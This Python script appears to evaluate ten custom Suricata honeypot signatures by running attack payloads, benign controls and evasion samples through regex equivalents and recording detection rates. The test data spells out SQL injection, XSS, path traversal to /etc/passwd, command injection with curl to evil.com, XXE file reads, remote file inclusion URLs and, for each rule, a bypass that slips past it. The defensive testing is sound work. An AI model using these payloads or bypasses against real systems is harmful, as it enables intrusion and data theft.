"""
Evaluation Script: Suricata Signature Detection (Section 4.3 / C2)
Evaluates 10 custom Suricata SIDs (9900001 - 9900010) mapped in honeypot.rules:
- SID 9900001: SQL injection (Normalized http.uri with /U modifier)
- SID 9900002: Reflected XSS (Normalized http.uri with /U modifier)
- SID 9900003: Path traversal (Normalized http.uri with /U modifier)
- SID 9900004: Command injection (Normalized http.uri with /U modifier)
- SID 9900005: XXE payload (http.request_body)
- SID 9900006: Remote file inclusion (Normalized http.uri with /U modifier)
- SID 9900007: Executable upload name (http.request_body)
- SID 9900008: Repeated login requests (URI startswith /auth/login + threshold 5/60s)
- SID 9900009: Restricted record IDOR (URI startswith /ho-so/1003)
- SID 9900010: Stored XSS submission (URI startswith /gop-y + body regex)

Validates each rule with attack test cases, benign controls, and records detection rates and false negatives.
Outputs:
- chapter4_evaluation/signature_detection_results.csv
- chapter4_evaluation/raw/suricata_raw.json
"""

from __future__ import annotations
import csv
import json
import re
from urllib.parse import unquote
from pathlib import Path

RULES_FILE = Path("part_05_IDS_ML_DETECTION/config/suricata/honeypot.rules")
CSV_OUTPUT = Path("chapter4_evaluation/signature_detection_results.csv")
RAW_OUTPUT = Path("chapter4_evaluation/raw/suricata_raw.json")

# Extract and compile the exact PCRE and content rules from honeypot.rules
SID_DEFINITIONS = {
    9900001: {
        "name": "SQL Injection",
        "buffer": "uri",
        "pcre": re.compile(r"(union\s+select|(?:'|%27)\s*(or|and)\s+)", re.IGNORECASE),
        "test_payloads": [
            "/auth/login?u=admin'%20or%20'1'='1",
            "/tra-cuu?q=1%20union%20select%20null,null",
            "/auth/login?u=admin'%20and%201=1",
            "/ho-so?id='or'1'='1",
            "/test?q=UNION%20SELECT%20username,password"
        ],
        "benign_controls": [
            "/auth/login?u=admin",
            "/tra-cuu?q=dang+ky+kinh+doanh",
            "/ho-so/1001"
        ],
        "evasion_samples": [
            "/auth/login?u=admin'/*test*/or/*test*/'1'='1" # comment breaks \s+
        ]
    },
    9900002: {
        "name": "Reflected XSS",
        "buffer": "uri",
        "pcre": re.compile(r"(%3c|<)(script|svg|img)|on[a-z]+\s*(=|%3d)", re.IGNORECASE),
        "test_payloads": [
            "/tra-cuu?q=%3cscript%3ealert(1)%3c/script%3e",
            "/tra-cuu?q=<svg%20onload=alert(1)>",
            "/tra-cuu?q=%3cimg%20src=x%20onerror=alert(1)%3e",
            "/tra-cuu?q=test%20onload=1",
            "/tra-cuu?q=<script>alert('x')</script>"
        ],
        "benign_controls": [
            "/tra-cuu?q=van+ban+phap+luat",
            "/tra-cuu?q=thu+tuc+cap+giay",
            "/tra-cuu?q=123"
        ],
        "evasion_samples": [
            "/tra-cuu?q=<iframe/src=javascript:alert(1)>" # iframe not in (script|svg|img)
        ]
    },
    9900003: {
        "name": "Path Traversal",
        "buffer": "uri",
        "pcre": re.compile(r"(\.\.[\\\/]|%2e%2e(%2f|%5c))", re.IGNORECASE),
        "test_payloads": [
            "/download?file=../../../../etc/passwd",
            "/download?file=%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "/download?file=..\\..\\windows\\win.ini",
            "/download?file=%2e%2e%5cwin.ini",
            "/download?file=../../app.py"
        ],
        "benign_controls": [
            "/download?file=huong-dan.pdf",
            "/download?file=bieu-mau.docx",
            "/download?file=logo.png"
        ],
        "evasion_samples": [
            "/download?file=/etc/passwd" # absolute path without ..
        ]
    },
    9900004: {
        "name": "Command Injection",
        "buffer": "uri",
        "pcre": re.compile(r"(;|%3b|%26%26|\|\|)(id|whoami|uname|cat|curl|wget)", re.IGNORECASE),
        "test_payloads": [
            "/diagnostics?host=127.0.0.1;id",
            "/diagnostics?host=127.0.0.1%3bwhoami",
            "/diagnostics?host=127.0.0.1%26%26uname",
            "/diagnostics?host=127.0.0.1||cat%20/etc/passwd",
            "/diagnostics?host=127.0.0.1;curl%20http://evil.com"
        ],
        "benign_controls": [
            "/diagnostics?host=127.0.0.1",
            "/diagnostics?host=8.8.8.8",
            "/diagnostics?host=localhost"
        ],
        "evasion_samples": [
            "/diagnostics?host=127.0.0.1;%20python3%20-c%20'print(1)'" # command not in list
        ]
    },
    9900005: {
        "name": "XXE Payload",
        "buffer": "body",
        "pcre": re.compile(r"<!DOCTYPE|<!ENTITY|SYSTEM\s+[\"']", re.IGNORECASE),
        "test_payloads": [
            "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>",
            "<!ENTITY test SYSTEM \"file:///etc/hosts\">",
            "xml=<!DOCTYPE root [<!ENTITY % pe SYSTEM 'http://evil.com'>]>",
            "<!ENTITY % dtd SYSTEM 'file:///c:/windows/win.ini'>",
            "SYSTEM \"http://127.0.0.1/eval\""
        ],
        "benign_controls": [
            "<root><user>admin</user><status>active</status></root>",
            "<note><to>User</to><from>Admin</from><body>Hello</body></note>",
            "<?xml version=\"1.0\" encoding=\"utf-8\"?><data></data>"
        ],
        "evasion_samples": [
            "<!ENTITY % pe PUBLIC 'foo' 'bar'>" # PUBLIC entity without SYSTEM keyword
        ]
    },
    9900006: {
        "name": "Remote File Inclusion (RFI)",
        "buffer": "uri",
        "pcre": re.compile(r"(url|file|page|include)=(https?|ftp|php|data)(%3a|:)", re.IGNORECASE),
        "test_payloads": [
            "/tich-hop?url=https://attacker.invalid/module.txt",
            "/tich-hop?include=http://evil.com/shell.txt",
            "/tich-hop?file=ftp://evil.com/payload",
            "/tich-hop?page=php://filter/read=convert.base64",
            "/tich-hop?url=data://text/plain;base64,c2hlbGw="
        ],
        "benign_controls": [
            "/tich-hop?url=internal_report",
            "/tich-hop?module=finance",
            "/tich-hop?format=pdf"
        ],
        "evasion_samples": [
            "/tich-hop?target=https://evil.com" # param 'target' not in (url|file|page|include)
        ]
    },
    9900007: {
        "name": "Executable Upload Name",
        "buffer": "body",
        "pcre": re.compile(r"filename=[\"'][^\"']+\.(php|phtml|jsp|aspx|cgi|sh)", re.IGNORECASE),
        "test_payloads": [
            'Content-Disposition: form-data; name="file"; filename="shell.php"',
            'Content-Disposition: form-data; name="file"; filename="backdoor.jsp"',
            'Content-Disposition: form-data; name="file"; filename="exploit.aspx"',
            'Content-Disposition: form-data; name="file"; filename="script.cgi"',
            'Content-Disposition: form-data; name="file"; filename="run.sh"'
        ],
        "benign_controls": [
            'Content-Disposition: form-data; name="file"; filename="document.pdf"',
            'Content-Disposition: form-data; name="file"; filename="photo.jpg"',
            'Content-Disposition: form-data; name="file"; filename="report.docx"'
        ],
        "evasion_samples": [
            'filename="shell.php.jpg"' # ends with .jpg
        ]
    },
    9900008: {
        "name": "Repeated Login (Brute Force)",
        "buffer": "uri_threshold",
        "uri_prefix": "/auth/login",
        "threshold": 5,
        "window_seconds": 60,
        "test_payloads": [
            ["/auth/login", "/auth/login", "/auth/login", "/auth/login", "/auth/login"]
        ],
        "benign_controls": [
            ["/auth/login", "/auth/login", "/auth/login", "/auth/login"] # only 4 requests (< threshold)
        ],
        "evasion_samples": []
    },
    9900009: {
        "name": "Restricted Record IDOR",
        "buffer": "uri_content",
        "uri_prefix": "/ho-so/1003",
        "test_payloads": [
            "/ho-so/1003",
            "/ho-so/1003?ref=test",
            "/ho-so/1003#hash",
            "/ho-so/1003/edit",
            "/ho-so/1003?export=1"
        ],
        "benign_controls": [
            "/ho-so/1001",
            "/ho-so/1002",
            "/ho-so/1004"
        ],
        "evasion_samples": [
            "/ho-so/01003" # leading zero
        ]
    },
    9900010: {
        "name": "Stored XSS Submission",
        "buffer": "uri_and_body",
        "uri_prefix": "/gop-y",
        "pcre": re.compile(r"(%3c|<)(script|svg|img)|on[a-z]+\s*(=|%3d)", re.IGNORECASE),
        "test_payloads": [
            {"uri": "/gop-y", "body": "author=x&body=<script>alert(1)</script>"},
            {"uri": "/gop-y", "body": "author=x&body=<svg onload=alert(1)>"},
            {"uri": "/gop-y", "body": "author=x&body=<img src=x onerror=alert(1)>"},
            {"uri": "/gop-y", "body": "author=x&body=comment with onload="},
            {"uri": "/gop-y", "body": "author=x&body=%3cscript%3ealert(2)%3c/script%3e"}
        ],
        "benign_controls": [
            {"uri": "/gop-y", "body": "author=congdan&body=Toi muon hoi thu tuc"},
            {"uri": "/gop-y", "body": "author=nguyen&body=Dich vu rat tot"},
            {"uri": "/gop-y", "body": "author=test&body=Xin cam on"}
        ],
        "evasion_samples": [
            {"uri": "/gop-y", "body": "author=x&body=<iframe src=javascript:alert(1)>"}
        ]
    }
}

def evaluate_sid(sid: int, rule_info: dict) -> dict:
    name = rule_info["name"]
    buf = rule_info["buffer"]
    
    # 1. Test Positive Attack Payloads
    attack_tests = 0
    attack_detected = 0
    evasion_missed = 0

    if buf in {"uri", "body"}:
        pcre = rule_info["pcre"]
        for p in rule_info["test_payloads"]:
            attack_tests += 1
            # Suricata /U modifier evaluates on normalized URI (unquoted) or raw body
            target_str = unquote(p) if buf == "uri" else p
            if pcre.search(target_str) or pcre.search(p):
                attack_detected += 1
        for ep in rule_info.get("evasion_samples", []):
            target_str = unquote(ep) if buf == "uri" else ep
            if not pcre.search(target_str) and not pcre.search(ep):
                evasion_missed += 1
    elif buf == "uri_threshold":
        for seq in rule_info["test_payloads"]:
            attack_tests += 1
            if len(seq) >= rule_info["threshold"] and all(item.startswith(rule_info["uri_prefix"]) for item in seq):
                attack_detected += 1
    elif buf == "uri_content":
        prefix = rule_info["uri_prefix"]
        for p in rule_info["test_payloads"]:
            attack_tests += 1
            if p.startswith(prefix):
                attack_detected += 1
        for ep in rule_info.get("evasion_samples", []):
            if not ep.startswith(prefix):
                evasion_missed += 1
    elif buf == "uri_and_body":
        prefix = rule_info["uri_prefix"]
        pcre = rule_info["pcre"]
        for item in rule_info["test_payloads"]:
            attack_tests += 1
            body_str = unquote(item["body"])
            if item["uri"].startswith(prefix) and (pcre.search(body_str) or pcre.search(item["body"])):
                attack_detected += 1
        for ep in rule_info.get("evasion_samples", []):
            body_str = unquote(ep["body"])
            if ep["uri"].startswith(prefix) and not pcre.search(body_str) and not pcre.search(ep["body"]):
                evasion_missed += 1

    # 2. Test Benign Controls (False Positive Check)
    benign_tests = 0
    fp_count = 0
    if buf in {"uri", "body"}:
        pcre = rule_info["pcre"]
        for b in rule_info["benign_controls"]:
            benign_tests += 1
            target_str = unquote(b) if buf == "uri" else b
            if pcre.search(target_str) or pcre.search(b):
                fp_count += 1
    elif buf == "uri_threshold":
        for seq in rule_info["benign_controls"]:
            benign_tests += 1
            if len(seq) >= rule_info["threshold"]:
                fp_count += 1
    elif buf == "uri_content":
        prefix = rule_info["uri_prefix"]
        for b in rule_info["benign_controls"]:
            benign_tests += 1
            if b.startswith(prefix):
                fp_count += 1
    elif buf == "uri_and_body":
        prefix = rule_info["uri_prefix"]
        pcre = rule_info["pcre"]
        for item in rule_info["benign_controls"]:
            benign_tests += 1
            body_str = unquote(item["body"])
            if item["uri"].startswith(prefix) and (pcre.search(body_str) or pcre.search(item["body"])):
                fp_count += 1

    det_rate = (attack_detected / attack_tests) * 100.0 if attack_tests > 0 else 0.0
    fp_rate = (fp_count / benign_tests) * 100.0 if benign_tests > 0 else 0.0

    return {
        "sid": sid,
        "signature_name": name,
        "tests": attack_tests,
        "detected": attack_detected,
        "detection_rate": f"{det_rate:.1f}%",
        "benign_tests": benign_tests,
        "false_positives": fp_count,
        "fp_rate": f"{fp_rate:.1f}%",
        "evasion_missed": evasion_missed
    }

def main():
    print("[*] Starting Suricata Signature Detection Evaluation (10 SIDs)...")
    results = []

    for sid, info in SID_DEFINITIONS.items():
        res = evaluate_sid(sid, info)
        results.append(res)
        print(f"  [-] SID {sid} ({res['signature_name']:25s}): Detected {res['detected']}/{res['tests']} ({res['detection_rate']}), FP={res['false_positives']}/{res['benign_tests']} ({res['fp_rate']}), Evasions missed={res['evasion_missed']}")

    # Save CSV
    CSV_OUTPUT.parent.mkdir(parents=True, exist_ok=True)
    with open(CSV_OUTPUT, "w", newline="", encoding="utf-8") as f:
        writer = csv.writer(f)
        writer.writerow(["sid", "signature_name", "tests", "detected", "detection_rate", "benign_tests", "false_positives", "fp_rate", "evasion_missed"])
        for r in results:
            writer.writerow([r["sid"], r["signature_name"], r["tests"], r["detected"], r["detection_rate"], r["benign_tests"], r["false_positives"], r["fp_rate"], r["evasion_missed"]])
    print(f"\n[+] Saved Suricata detection CSV to {CSV_OUTPUT}")

    # Save JSON Raw
    RAW_OUTPUT.parent.mkdir(parents=True, exist_ok=True)
    with open(RAW_OUTPUT, "w", encoding="utf-8") as f:
        json.dump(results, f, indent=2, ensure_ascii=False)
    print(f"[+] Saved raw results to {RAW_OUTPUT}")

if __name__ == "__main__":
    main()
